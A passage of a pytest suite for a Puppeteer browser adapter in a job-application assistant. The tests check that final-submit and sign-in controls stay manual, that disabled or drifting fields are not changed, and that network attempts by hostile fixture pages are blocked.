        with pytest.raises(BrowserAdapterError, match="final_or_anchor_not_automated"):
            session.click_offline(drift["target_id"], continuation=False)

        after = session.observe()
        assert after["url"] == logical_url
        assert not any(button["element_id"] == "drift-listener-marker" for button in after["buttons"])
        counters = session.network_counters()
        assert counters["terminal_reason"] is None
        for key in ("denied", "attackerDnsLookups", "upstreamConnectAttempts", "upstreamHttpAttempts"):
            assert counters[key] == before[key]
        assert FixtureHandler.static_requests == before_static_requests
        assert FixtureHandler.attacker_http_requests == before_attacker_requests
        assert FixtureHandler.final_like_requests == 0

@BROWSER_INTEGRATION_SKIP
def test_native_progress_button_semantics_reject_non_progress_controls(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-native-progress")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-native-progress-semantics",
        run_id=44,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)

        for element_id in ("continue-button", "next-button", "next-input"):
            observation = session.observe()
            button = next(item for item in observation["buttons"] if item["element_id"] == element_id)
            assert session.click_offline(button["target_id"], continuation=False)["clicked"] is True

        observation = session.observe()
        detached_submit = next(item for item in observation["buttons"] if item["element_id"] == "continue-detached")
        assert detached_submit["button_type"] == "submit"
        assert session.click_offline(detached_submit["target_id"], continuation=True)["clicked"] is True

        forbidden = (
            ("apply-button", False),
            ("create-alert-button", False),
            ("quick-apply-button", False),
            ("next-google-button", False),
            ("continue-with-account-button", False),
            ("continue-via-google-button", False),
            ("continue-using-example-button", False),
            ("next-with-google-button", False),
            ("apply-submit", True),
        )
        for element_id, continuation in forbidden:
            observation = session.observe()
            button = next(item for item in observation["buttons"] if item["element_id"] == element_id)
            with pytest.raises(BrowserAdapterError, match="final_or_anchor_not_automated"):
                session.click_offline(button["target_id"], continuation=continuation)

        assert session.observe()["url"] == logical_url
        counters = session.network_counters()
        assert counters["terminal_reason"] is None
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_native_and_aria_disabled_buttons_are_observed_disabled_and_not_dispatched(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-native-disabled-fieldset")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-disabled-controls",
        run_id=48,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        for element_id in (
            "disabled-continue",
            "aria-disabled-continue",
            "aria-disabled-ancestor-continue",
        ):
            observation = session.observe()
            disabled = next(
                button
                for button in observation["buttons"]
                if button["element_id"] == element_id
            )
            assert disabled["enabled"] is False

            with pytest.raises(BrowserAdapterError, match="target_not_actionable"):
                session.click_offline(disabled["target_id"], continuation=False)

            after = session.observe()
            assert not any(
                button["element_id"] == f"{element_id}-listener-marker"
                for button in after["buttons"]
            )
        assert session.network_counters()["terminal_reason"] is None
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_action_time_aria_disabled_drift_is_not_dispatched(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-native-disabled-fieldset")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-aria-disabled-drift",
        run_id=49,
        job_id=123,
        internal_transport_url=transport_url,
        test_drift=True,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        button = next(
            item
            for item in observation["buttons"]
            if item["element_id"] == "aria-disabled-drift-continue"
        )
        assert button["enabled"] is True

        assert session._arm_button_aria_disabled_drift_for_test()["armed"] is True
        with pytest.raises(BrowserAdapterError, match="target_not_actionable"):
            session.click_offline(button["target_id"], continuation=False)

        after = session.observe()
        drifted = next(
            item
            for item in after["buttons"]
            if item["element_id"] == "aria-disabled-drift-continue"
        )
        assert drifted["enabled"] is False
        assert not any(
            item["element_id"] == "aria-disabled-drift-continue-listener-marker"
            for item in after["buttons"]
        )
        assert session.network_counters()["terminal_reason"] is None
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
@pytest.mark.parametrize(
    ("field_name", "element_id", "action", "next_value", "initial_value"),
    [
        ("aria_drift_field", "aria-disabled-drift-field", "fill", "Ada", ""),
        ("aria_drift_check", "aria-disabled-drift-check", "check", True, False),
        ("aria_drift_select", "aria-disabled-drift-select", "select", "us", ""),
        ("aria_drift_multi", "aria-disabled-drift-multi", "select", ("go", "rust"), []),
    ],
)
def test_action_time_field_aria_disabled_drift_is_not_mutated_or_dispatched(
    fixture_server,
    field_name,
    element_id,
    action,
    next_value,
    initial_value,
):
    transport_url = fixture_server.replace("/clean", "/continue-native-disabled-fieldset")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id=f"session-field-aria-disabled-drift-{action}-{field_name}",
        run_id=50,
        job_id=123,
        internal_transport_url=transport_url,
        test_drift=True,
    ) as session:
        session.goto(logical_url)
        field = field_by_name(session.observe(), field_name)
        assert field["enabled"] is True
        assert field["value"] == initial_value

        assert session._arm_field_aria_disabled_drift_for_test()["armed"] is True
        with pytest.raises(BrowserAdapterError, match="target_not_actionable"):
            getattr(session, action)(field["target_id"], next_value)

        after = session.observe()
        drifted = field_by_name(after, field_name)
        assert drifted["enabled"] is False
        assert drifted["value"] == initial_value
        assert not any(
            item["element_id"] == f"{element_id}-listener-marker"
            for item in after["buttons"]
        )
        assert session.network_counters()["terminal_reason"] is None
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_native_auth_controls_are_observation_blockers(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-native-auth-blocker")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-native-auth-blocker",
        run_id=46,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        blockers = [blocker for blocker in observation["blockers"] if blocker["code"] == "authentication_required"]
        assert blockers
        assert any("Sign in" in blocker["text"] for blocker in blockers)
        assert any(button["element_id"] == "sign-in-button" for button in observation["buttons"])
        assert any(button["element_id"] == "create-account-button" for button in observation["buttons"])
        assert session.network_counters()["terminal_reason"] is None

@pytest.mark.parametrize(
    "endpoint",
    (
        "continue-native-favicon-script",
        "continue-native-cross-origin-script",
        "continue-native-websocket-script",
        "continue-native-popup-script",
    ),
)
def test_script_network_request_after_click_remains_terminal(fixture_server, endpoint):
    transport_url = fixture_server.replace("/clean", f"/{endpoint}")
    with PuppeteerSession.start(
        headless=True,
        session_id=f"session-{endpoint}",
        run_id=4,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        observation = session.observe()
        continuation = next(
            button
            for button in observation["buttons"]
            if button["button_type"] == "submit"
            and button["target_id"] not in observation["final_submit_target_ids"]
        )
        before = session.network_counters()
        with pytest.raises(BrowserAdapterError, match="unsafe_network_attempt"):
            session.click_offline(continuation["target_id"], continuation=True)

        counters = session.network_counters()
        assert counters["terminal_reason"] == "unsafe_network_attempt"
        assert counters["upstreamConnectAttempts"] == before["upstreamConnectAttempts"]
        assert counters["dnsLookups"] == before["dnsLookups"]
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
@pytest.mark.parametrize("endpoint", ("continue-native-cross-job", "continue-native-final"))
def test_submit_continuation_rejects_cross_job_and_final_like_history(fixture_server, endpoint):
    transport_url = fixture_server.replace("/clean", f"/{endpoint}")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id=f"session-{endpoint}",
        run_id=3,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        continuation = next(
            button
            for button in observation["buttons"]
            if button["button_type"] == "submit"
            and button["target_id"] not in observation["final_submit_target_ids"]
        )
        with pytest.raises(BrowserAdapterError, match="unsafe_navigation_target"):
            session.click_offline(continuation["target_id"], continuation=True)

        counters = session.network_counters()
        assert counters["terminal_reason"] == "unsafe_navigation_target"
        assert FixtureHandler.final_like_requests == 0
        assert FixtureHandler.attacker_http_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_input_type_button_offline_click_with_form_is_allowed_and_reobserved(fixture_server):
    transport_url = fixture_server.replace("/clean", "/input-button")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-input-button",
        run_id=5,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        offline = next(
            button
            for button in observation["buttons"]
            if button["element_kind"] == "input" and button["button_type"] == "button"
        )
        assert offline["target_id"] not in observation["final_submit_target_ids"]
        assert offline["effective_action_url"] is None
        assert offline["effective_method"] is None
        assert offline["value"] == "Continue"
        before = session.network_counters()
        result = session.click_offline(offline["target_id"])
        assert result["clicked"] is True
        next_observation = session.observe()
        assert next_observation["url"] == logical_url
        assert any(field["name"] == "revealed_step" for field in next_observation["fields"])
        assert any(
            button["element_kind"] == "input" and button["button_type"] == "button"
            for button in next_observation["buttons"]
        )
        second = next(
            button
            for button in next_observation["buttons"]
            if button["element_kind"] == "input" and button["button_type"] == "button"
        )
        with pytest.raises(BrowserAdapterError, match="final_or_anchor_not_automated"):
            session.click_offline(second["target_id"], continuation=True)
        counters = session.network_counters()
        assert counters["terminal_reason"] is None
        for name in ("allowed", "denied", "dnsLookups", "upstreamConnectAttempts", "upstreamHttpAttempts", "proxyRequests"):
            assert counters[name] == before[name]
        assert FixtureHandler.final_like_requests == 0
        assert FixtureHandler.attacker_http_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_input_type_button_final_like_value_is_denied_and_kept_zero(fixture_server):
    transport_url = fixture_server.replace("/clean", "/input-button-final")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-input-button-final",
        run_id=6,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        final_like = next(
            button
            for button in observation["buttons"]
            if button["element_kind"] == "input" and button["button_type"] == "button"
        )
        assert final_like["value"] == "Submit Application"
        assert final_like["target_id"] in observation["final_submit_target_ids"]
        with pytest.raises(BrowserAdapterError, match="final_or_anchor_not_automated"):
            session.click_offline(final_like["target_id"])
        counters = session.network_counters()
        assert counters["terminal_reason"] is None
        assert FixtureHandler.final_like_requests == 0
        assert FixtureHandler.attacker_http_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_input_type_button_hostile_listener_remains_terminal_and_offline(fixture_server):
    transport_url = fixture_server.replace("/clean", "/input-button-network")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-input-button-network",
        run_id=7,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        continuation = next(
            button
            for button in observation["buttons"]
            if button["element_kind"] == "input" and button["button_type"] == "button"
        )
        before = session.network_counters()
        with pytest.raises(BrowserAdapterError, match="unsafe_network_attempt"):
            session.click_offline(continuation["target_id"])
        counters = session.network_counters()
        assert counters["terminal_reason"] == "unsafe_network_attempt"
        assert counters["upstreamConnectAttempts"] == before["upstreamConnectAttempts"]
        assert counters["dnsLookups"] == before["dnsLookups"]
        assert counters["attackerDnsLookups"] == before["attackerDnsLookups"]
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0






@BROWSER_INTEGRATION_SKIP
def test_single_select_empty_placeholder_can_select_enabled_value(fixture_server):
    transport_url = fixture_server.replace("/clean", "/single-select-empty-placeholder")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-single-select-empty-placeholder",
        run_id=33,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "country")
        assert field["multiple"] is False
        assert field["value"] == ""
        assert field["valid"] is False
        assert field["validity_flags"] == ["valueMissing"]
        session.select(field["target_id"], "us")
        after = session.observe()
        selected = field_by_name(after, "country")
        assert selected["value"] == "us"
        assert selected["valid"] is True
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_multi_select_two_value_selection_and_observation(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select",
        run_id=20,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        assert field["kind"] == "select"
        assert field["multiple"] is True
        assert field["value"] == []
        assert "options_ambiguous" not in field["validity_flags"]
        assert [opt["value"] for opt in field["options"]] == ["go", "rust", "python", "js"]
        assert all(opt["enabled"] for opt in field["options"])
        session.select(field["target_id"], ("go", "rust"))
        after = session.observe()
        field2 = field_by_name(after, "skills")
        assert field2["value"] == ["go", "rust"]
        assert field2["valid"] is True
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_multi_select_rejects_out_of_order_values(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select-out-of-order",
        run_id=26,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        with pytest.raises(BrowserAdapterError, match="invalid_select_value"):
            session.select(field["target_id"], ("rust", "go"))
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_multi_select_rejects_disabled_option_and_disabled_optgroup(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select-disabled")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select-disabled",
        run_id=21,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        assert field["multiple"] is True
        options = {opt["value"]: opt for opt in field["options"]}
        assert options["go"]["enabled"] is True
        assert options["rust"]["enabled"] is False
        assert options["cobol"]["enabled"] is False
        with pytest.raises(BrowserAdapterError, match="invalid_select_value"):
            session.select(field["target_id"], ("rust", "cobol", "go"))
        observation = session.observe()
        field = field_by_name(observation, "skills")
        session.select(field["target_id"], ("go",))
        after = session.observe()
        field2 = field_by_name(after, "skills")
        assert field2["value"] == ["go"]
        assert field2["valid"] is True
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0

@BROWSER_INTEGRATION_SKIP
def test_multi_select_disabled_optgroup_native_ancestry_wins_zero_change(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select-disabled-optgroup-spoof")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select-disabled-optgroup-spoof",
        run_id=31,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        options = {opt["value"]: opt for opt in field["options"]}
        assert options["go"]["enabled"] is True
        assert options["cobol"]["enabled"] is False
        assert field["value"] == []
        with pytest.raises(BrowserAdapterError, match="invalid_select_value"):
            session.select(field["target_id"], ("cobol",))
        after = session.observe()
        field2 = field_by_name(after, "skills")
        assert field2["value"] == []
        assert field2["options"][1]["enabled"] is False
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_multi_select_duplicate_values_denied(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select-duplicate")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select-duplicate",
        run_id=22,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        assert "options_ambiguous" in field["validity_flags"]
        assert field["valid"] is False
        with pytest.raises(BrowserAdapterError, match="invalid_select_value"):
            session.select(field["target_id"], ("go",))
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_multi_select_disabled_duplicate_value_only_enabled_index_selected(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select-disabled-duplicate")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select-disabled-duplicate",
        run_id=25,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        assert "options_ambiguous" in field["validity_flags"]
        assert field["valid"] is False
        assert field["options"][0]["enabled"] is False
        assert field["options"][1]["enabled"] is True
        with pytest.raises(BrowserAdapterError, match="invalid_select_value"):
            session.select(field["target_id"], ("go",))
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_multi_select_own_getter_masking_defeated(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select-masked")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select-masked",
        run_id=23,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        assert field["multiple"] is True
        assert [opt["value"] for opt in field["options"]] == ["go", "rust", "python"]
        assert field["value"] == []
        assert field["options"][0]["value"] == "go"
        session.select(field["target_id"], ("rust", "python"))
        after = session.observe()
        field2 = field_by_name(after, "skills")
        assert field2["value"] == ["rust", "python"]
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0



@BROWSER_INTEGRATION_SKIP
def test_multi_select_option_label_getters_spoof_defeated(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select-option-label-spoof")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select-option-label-spoof",
        run_id=30,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        assert field["multiple"] is True
        assert all(set(option) == {"value", "label", "enabled"} for option in field["options"])
        assert [(opt["value"], opt["label"]) for opt in field["options"]] == [
            ("go", "Go"),
            ("rust", "Rust"),
            ("python", "Python"),
        ]
        session.select(field["target_id"], ("go", "rust"))
        after = session.observe()
        field2 = field_by_name(after, "skills")
        assert field2["value"] == ["go", "rust"]
        assert [(opt["value"], opt["label"]) for opt in field2["options"]] == [
            ("go", "Go"),
            ("rust", "Rust"),
            ("python", "Python"),
        ]
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0

@BROWSER_INTEGRATION_SKIP
def test_multi_select_timer_drift_rejected_before_mutation(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select-toctou-timer")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select-toctou-timer",
        run_id=32,
        job_id=123,
        internal_transport_url=transport_url,
        test_drift=True,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        assert field["value"] == []
        assert all(set(option) == {"value", "label", "enabled"} for option in field["options"])
        session._trigger_select_drift_for_test()
        with pytest.raises(BrowserAdapterError, match="stale_generation"):
            session.select(field["target_id"], ("go", "rust"))
        after = session.observe()
        assert field_by_name(after, "skills")["value"] == ["rust"]
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_select_drift_rejected_without_internal_transport():
    with pytest.raises(BrowserAdapterError, match="test_select_drift_unavailable"):
        PuppeteerSession.start(
            headless=True,
            session_id="session-drift-no-transport",
            run_id=33,
            job_id=123,
            test_drift=True,
        )


@BROWSER_INTEGRATION_SKIP
@pytest.mark.parametrize("bad", [0, None, "", 1, "yes"])
def test_select_drift_rejected_for_non_bool(bad):
    with pytest.raises(BrowserAdapterError, match="test_select_drift_unavailable"):
        PuppeteerSession.start(
            headless=True,
            session_id="session-drift-non-bool",
            run_id=33,
            job_id=123,
            internal_transport_url="http://127.0.0.1:1/clean",
            test_drift=bad,
        )


@BROWSER_INTEGRATION_SKIP
def test_multi_select_post_event_descriptor_drift_is_not_retained(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select-post-event-drift")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select-post-event-drift",
        run_id=34,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        with pytest.raises(BrowserAdapterError, match="field_value_not_retained"):
            session.select(field["target_id"], ("go", "rust"))
        after = session.observe()
        drifted = field_by_name(after, "skills")
        assert drifted["valid"] is False
        assert "options_ambiguous" in drifted["validity_flags"]
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_multi_select_multiple_spoof_defeated(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select-multiple-spoof")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select-multiple-spoof",
        run_id=27,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        assert field["multiple"] is True
        session.select(field["target_id"], ("go", "rust"))
        after = session.observe()
        field2 = field_by_name(after, "skills")
        assert field2["value"] == ["go", "rust"]
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_multi_select_options_spoof_defeated(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select-options-spoof")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select-options-spoof",
        run_id=28,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        assert [opt["value"] for opt in field["options"]] == ["go", "rust", "python"]
        session.select(field["target_id"], ("go", "rust"))
        after = session.observe()
        field2 = field_by_name(after, "skills")
        assert field2["value"] == ["go", "rust"]
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_multi_select_preselected_disabled_rejected_and_zero_change(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select-preselected-disabled")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select-preselected-disabled",
        run_id=29,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        assert field["value"] == ["cobol"]
        with pytest.raises(BrowserAdapterError, match="invalid_select_value"):
            session.select(field["target_id"], ("go", "rust"))
        assert field["valid"] is False
        assert field["validity_flags"].count("invalid_selected_option") == 1
        after = session.observe()
        field2 = field_by_name(after, "skills")
        assert field2["value"] == ["cobol"]
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0

@BROWSER_INTEGRATION_SKIP
def test_multi_select_hostile_input_change_listener_remains_terminal_and_offline(fixture_server):
    transport_url = fixture_server.replace("/clean", "/multi-select-hostile")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-multi-select-hostile",
        run_id=24,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        field = field_by_name(observation, "skills")
        before = session.network_counters()
        with pytest.raises(BrowserAdapterError, match="unsafe_network_attempt"):
            session.select(field["target_id"], ("go", "rust"))
        counters = session.network_counters()
        assert counters["terminal_reason"] == "unsafe_network_attempt"
        assert counters["upstreamConnectAttempts"] == before["upstreamConnectAttempts"]
        assert counters["dnsLookups"] == before["dnsLookups"]
        assert counters["attackerDnsLookups"] == before["attackerDnsLookups"]
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_lever_session_uses_selected_policy_and_keeps_final_submit_manual(fixture_server):
    with PuppeteerSession.start(
        headless=True,
        ats_policy="lever",
        session_id="session-lever",
        run_id=101,
        job_id=123,
        internal_transport_url=fixture_server,
    ) as session:
        result = session.goto("https://jobs.lever.co/example/123e4567-e89b-12d3-a456-426614174000/apply")
        assert result["mode"] == "lever_apply"
        observation = session.observe()
        assert observation["final_submit_target_ids"]
        assert any(field.get("name") == "first_name" for field in observation["fields"])
        target = next(button for button in observation["buttons"] if button["target_id"] in observation["final_submit_target_ids"])
        with pytest.raises(BrowserAdapterError, match="final_or_anchor_not_automated"):
            session.click_offline(target["target_id"])



@pytest.mark.skipif(
    os.environ.get("RUN_PUPPETEER_INTEGRATION") != "1",
    reason="set RUN_PUPPETEER_INTEGRATION=1 for the normal-parent-exit survival smoke",
)
@pytest.mark.skipif(
    os.name != "nt" and sys.platform.startswith("linux") and not os.environ.get("DISPLAY"),
    reason="headed Chromium requires a Linux display",
)
@pytest.mark.parametrize(
    "browser_exits_before_cleanup",
    (False, True),
    ids=("both-live", "browser-already-absent"),
)
@BROWSER_INTEGRATION_SKIP
def test_release_survives_normal_helper_exit_and_heartbeat(
    fixture_server,
    tmp_path,
    browser_exits_before_cleanup,
):
    """A released owner survives normal interpreter shutdown without a guardian."""
    run_dir = tmp_path / "run"
    manifest = run_dir / "review_session.json"
    helper = f"""
import json, sys
from jobs_assistant.browser_adapter import PuppeteerSession

session = None
released = False
try:
    session = PuppeteerSession.start(
        headless=False,
        session_id="session-normal-exit",
        run_id=72,
        job_id=172,
        run_cwd={str(run_dir)!r},
        screenshot_root={str(run_dir / "screenshots")!r},
        session_manifest={str(manifest)!r},
        internal_transport_url={fixture_server!r},
    )
    session.goto("https://boards.greenhouse.io/fixture/jobs/123?gh_src=human-review")
    assert session.prepare_handoff()["state"] == "prepared"
    assert session.commit_handoff("normal-exit-token-" + "a" * 32)["state"] == "open_guarded"
    assert session.release_handoff()["released"] is True
    released = True
    print(json.dumps({{"owner": session.owner_identity, "browser": session.browser_identity}}), flush=True)
finally:
    if session is not None and not released:
        session.close(force=True)
"""
    identities: dict | None = None
    try:
        result = subprocess.run(
            [sys.executable, "-c", helper],
            cwd=str(Path.cwd()),
            text=True,
            capture_output=True,
            timeout=90,
            check=False,
        )
        assert result.returncode == 0, result.stderr
        helper_lines = [line for line in result.stdout.splitlines() if line.strip()]
        assert helper_lines, result.stdout
        identities = json.loads(helper_lines[-1])
        owner = identities["owner"]
        browser = identities["browser"]
        assert _capture_process_identity(owner["pid"]) == owner
        assert _capture_process_identity(browser["pid"]) == browser
        assert owner["pid"] == owner["pgid"]
        assert owner["pgid"] != os.getpgrp()
        process_name = subprocess.run(
            ["ps", "-o", "comm=", "-p", str(owner["pid"])],
            text=True,
            capture_output=True,
            check=False,
        )
        assert process_name.returncode == 0
        assert "node" in process_name.stdout.lower()
        first_heartbeat = json.loads(manifest.read_text(encoding="utf-8"))["heartbeat"]
        heartbeat_values = {first_heartbeat}
        heartbeat_deadline = time.monotonic() + 16
        while time.monotonic() < heartbeat_deadline:
            current = json.loads(manifest.read_text(encoding="utf-8"))
            assert current["state"] == "open_guarded"
            assert current["detached"] is True
            profile_path = Path(current["profile_path"])
            assert profile_path.is_dir()
            assert any(entry.is_symlink() for entry in profile_path.rglob("*"))
            assert current["owner_identity"] == owner
            assert current["browser_identity"] == browser
            assert _capture_process_identity(owner["pid"]) == owner
            assert _capture_process_identity(browser["pid"]) == browser
            heartbeat_values.add(current["heartbeat"])
            if len(heartbeat_values) >= 2:
                break
            time.sleep(0.1)
        assert len(heartbeat_values) >= 2, "released owner did not emit a second heartbeat"
        if browser_exits_before_cleanup:
            os.killpg(browser["pgid"], signal.SIGKILL)
            deadline = time.monotonic() + 5
            while True:
                try:
                    os.killpg(browser["pgid"], 0)
                except ProcessLookupError:
                    break
                if time.monotonic() >= deadline:
                    pytest.fail("browser process group survived forced pre-cleanup exit")
                time.sleep(0.05)
    finally:
        if identities is not None:
            assert _validated_emergency_cleanup(identities, manifest)

@pytest.mark.skipif(
    os.environ.get("RUN_PUPPETEER_HEADED_SMOKE") != "1",
    reason="set RUN_PUPPETEER_HEADED_SMOKE=1 for the automated headed local diagnostic",
)
@pytest.mark.skipif(
    os.name != "nt" and sys.platform.startswith("linux") and not os.environ.get("DISPLAY"),
    reason="headed Chromium requires a Linux display",
)
@BROWSER_INTEGRATION_SKIP
def test_headed_local_fixture_diagnostic_closes_cleanly(fixture_server, tmp_path):
    """Exercise headed browser startup and a benign local mutation without handoff."""
    preflight = PuppeteerSession.preflight(headed=True)
    assert preflight["puppeteer"] == "24.43.1"

    run_dir = tmp_path / "run"
